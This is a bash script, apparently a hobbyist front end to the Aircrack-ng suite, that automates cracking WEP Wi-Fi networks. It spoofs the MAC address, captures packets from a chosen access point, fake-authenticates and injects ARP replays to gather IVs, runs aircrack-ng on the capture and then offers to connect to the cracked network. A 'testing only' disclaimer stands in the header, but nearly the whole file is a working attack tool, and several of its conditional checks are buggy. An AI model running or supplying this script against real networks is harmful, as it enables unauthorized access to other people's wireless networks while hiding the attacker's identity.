#!/bin/bash 
##########################################
##########################################
######## This script was created  ########
######## for testing purpose's on ########
######## -ly. Other purpose's are ########
######## Illegal.                 ########
######## You MUST set kismet to u ########
######## -se mon0 as the interfa  ########
######## -ce. This is a front end ########
######## of Aircrack-ng. To find  ########
######## out more about aircrac   ########
######## -k-ng go to :            ########
########      aircrack-ng.org .   ########
########      Created by Dub-T.   ########
##########################################
##########################################
#
#
#
#Kills the processes that may use your adapter.
sudo killall NetworkManager
sudo killall NetworkManagerDispatcher
sudo killall wpa_supplicant
sudo killall avahi-daemon
clear
#Stores your adapter to a variable: interface
read -p "Enter the Interface you would like to use : " interface
echo "wlo1"
clear
#Starts the adapter in monitor mode just in case you want to run kismet.
sudo airmon-ng start $interface
clear
#Ask if you have gathered packets and want to keep your temporary files from before.
read -p "If you have already ran this script and have temporary files left over from your last session, than you can continue using these files to add to your database of IV's. Would you like to keep these files for the cracking proccess later? (NOTE: If you select n, any temporary files from a previous session will be deleted.) (Y/n) : " temp
echo ""
#Reads the variable temp and if y will leave the directory Aircrack-ng-BASH-Script alone. If n it will delete any previous Aircrack-ng-BASH-Script directory.
if [ temp = y ]; then
   echo "Continueing..."
else
   sudo rm -R "Aircrack-ng-BASH-Script"
   clear
fi              
#Ask you if you would like to run kismet, and if so stores your answer to a variable: kismetm
clear
read -p "Would you like to run kismet to find a network to crack, and/or a client to fake your MAC Address? (Y/n) : " kismetm
echo ""
#If the variable kismetm equals y, the line will create a folder called: Aircrack-ng-BASH-Script, and store all temporary files there. Then it will run kismet.
if [ $kismetm = y ]; then
   mkdir "Aircrack-ng-BASH-Script"
   cd "Aircrack-ng-BASH-Script"
fi
clear
if [ $kismetm = y ]; then
   clear
   sudo xterm -e "kismet" &
   echo "Continuing...
   "
fi
clear
#Stores your desired transmission rate to a variable: rate
read -p "Enter the Transmission Rate would you like to set your interface:

1M, 2M, 5.5M, 6M, 9M, 11M, 12M, 18M, 24M, 36M, 48M, 54M : " rate
echo ""
clear
#Ask you if you would like to change your interfaces mac address, and if so stores your answer to a variable: macset
   clear
   read -p "Would you like to change your Wi-Fi card's MAC Address? (Y/n) : " macset
   echo ""
#This sets the MAC Address to what you choose
verifymac="n"
if [ $macset = y ]; then
   until [ $verifymac = y ]; do
#If the variable macset equals y, the script will ask if you would like a random mac address, and if so stores your answer to a variable: ramac
      if [ $macset = y ]; then
         clear
         read -p "Would you like a random MAC? (y/N) : " ramac
         clear
         echo "Continuing...
         "
      fi
#If the variable ramac equals y, the script will change your wifi cards mac address at random.
      if [ $ramac = y ]; then
         sudo ifconfig mon0 down
         sudo ifconfig $interface down
         sudo macchanger -r mon0
         sudo macchanger -r $interface
         sudo ifconfig mon0 up
         sudo ifconfig $interface up
      fi
      clear
#This displays your mac address from your interface so you can confirm it.
      sudo macchanger -s mon0
      echo "
      "
#This will ask for your confirmation on your mac address, and if you wish to change it will store it to a variable: hmac
      read -p "Please confirm MAC Address above, or provide a different MAC Address you want if you wish to change you MAC Address. : " hmac
      echo ""
      clear
#This reads the variable ramac and if n with change your interface to the desired mac address.
      if [ $ramac = n ]; then
         sudo ifconfig mon0 down
         sudo ifconfig $interface down
         sudo macchanger -m $hmac mon0
         sudo macchanger -m $hmac $interface
         sudo ifconfig mon0 up
         sudo ifconfig $interface up
      fi
      clear
#This sets your wifi cards mac address to the mac address of airmon-ng's mon0.
      if [ $macset = n ]; then
         sudo macchanger -m $hmac $interface
         sudo macchanger -m $hmac mon0
      fi
      clear
#This confirms the MAC Address
      sudo macchanger -s mon0
      echo "
      "
      read -p "Is this the MAC Address you want? (Y/n) : " verifymac
      echo ""
   done
fi
clear

#This will ask for your confirmation on your mac address, and if you wish to change it will store it to a variable: hmac
clear
if [ $macset = n ]; then
sudo macchanger -s mon0
   echo "
"
   read -p "Please confirm MAC Address above. : " hmac
   echo ""
   clear
   sudo macchanger -m $hmac $interface
   sudo macchanger -m $hmac mon0
fi
#This sets your wifi card to the transmission rate you want.
verifyap="n"
until [ $verifyap = y ]; do
   sudo iwconfig $interface rate $rate
   clear
#This next lines of commands ask for the necessary information about your access point.  
   read -p "Enter the Wi-Fi Access Points MAC Address : " mac
   echo ""
   clear
   read -p "Enter the Wi-Fi Access Points SSID : " ssid
   echo ""
   clear
   read -p "Enter the Wi-Fi Access Points Channel : " channel
   clear
#This will verify the info you have just typed, and will ask you if it's correct. This will then store it to a variable: start
   echo "Is this correct? : 

   Wi-Fi Card:

   Interface: $interface
   Interface's MAC: $hmac
   Transmission Rate: $rate

   Wi-Fi AP:

   Wi-Fi AP's MAC: $mac
   SSID: $ssid
   Channel: $channel
   "
   read -p "(Y/n) : " verifyap
   echo ""
#This will read variable start and if y, will continue. If the variable start is no, it will reset your wifi card and start over.
   if [ $start = y ]; then
      echo "Starting..."
   fi
done
clear
#This will close the kismet window.
sudo killall xterm
clear
#The next two lines will stop your wifi card and kill kismet to save cpu power for the cracking process. It will then start your wifi card in monitor mode and with the desired channel.
sudo airmon-ng stop mon0
sudo killall kismet
sudo airmon-ng start $interface $channel
clear
#This will create a folder, if kismet was not run, called: Aircrack-ng-BASH-Script, and store all temporary files there.
if [ $kismetm = n ]; then
   mkdir "Aircrack-ng-BASH-Script"
   cd "Aircrack-ng-BASH-Script"
fi
#This will start airodump-ng on the right channel and target the access point you desire.
sudo xterm -hold -e "airodump-ng -c $channel --bssid $mac -w output mon0"  &
echo "Starting Injections...
"
#The next two lines will set your card on the channel you desire and try to fake authenticate you on the network you wish to crack.
sudo iwconfig $interface channel $channel
sudo aireplay-ng -1 0 -e "$ssid" -a $mac -h $hmac mon0
echo "

"
#This will start requesting arp request at an average of 500 packets per second.
sudo xterm -hold -e "sudo  aireplay-ng -3 -b $mac -h $hmac mon0"  &
#If the above authorization fails, you can choose to start a more direct authorization. It will then store your answer to variable: ivs
read -p "Would you like to keep Re-autherizing yourself? (If you stop receiving IV's) (y/N) : " ivs
echo ""
#This will read variable ivs and if y will open a new window and start fake authorizing you as client.
clear
if [ $ivs = y ]; then
   clear
   sudo xterm -hold -e "aireplay-ng -1 6000 -o 1 -q 10 -e "$ssid" -a $mac -h $hmac mon0"  &
   clear
   echo "Continuing...
   "
fi
#This will ask you if you would like run aircrack-ng. It then stores your answer to variable: aircrack
read -p "Run Aircrack-ng? (Y/n) : " aircrack
echo ""
#This will read variable aircrack and if y will launch aircrack.
if [ $aircrack = y ]; then
   clear
   sudo xterm -hold -e "aircrack-ng -z output*.cap"  &
   clear
fi
#This will ask you if you would like to delete the temporary files then stores your anwser to variable delete.
clear
read -p "Would you like to delete the temporary files created during the gathering proccess? (y/N) : " delete
echo ""
#This will read the variable delete and if y will delete the files, if n it will leave the folder alone.
if [ $delete = y ]; then
   sudo rm -R "Aircrack-ng-BASH-Script"
   clear
   else echo "Continuing..."
fi
#This will ask you if you would like to stop your cracking and store your answer to variable: connect
clear
read -p "Would you like to connect to the Wi-Fi AP you just cracked? (Y/n) : " connect
echo ""
clear
#This will read variable connect and if y will stop cracking and start networkmanager for connecting to the network you cracked. If no it will stop cracking.
if [ $connect = y ]; then
   sudo airmon-ng stop mon0
   sudo NetworkManager
   sudo iwconfig $interface rate 54M
   sudo killall kismet
   sudo killall xterm
else
   sudo airmon-ng stop mon0
   sudo killall xterm
   sudo killall kismet
   sudo iwconfig $interface rate 54M
   exit
fi
#This confirms you successfully cracked the network
clear
read -p "Did you successfully crack the network? (Y/n) : " comp
echo ""
clear
if [ $comp = y ]; then
   exit 0
else   
   exit 1
fi
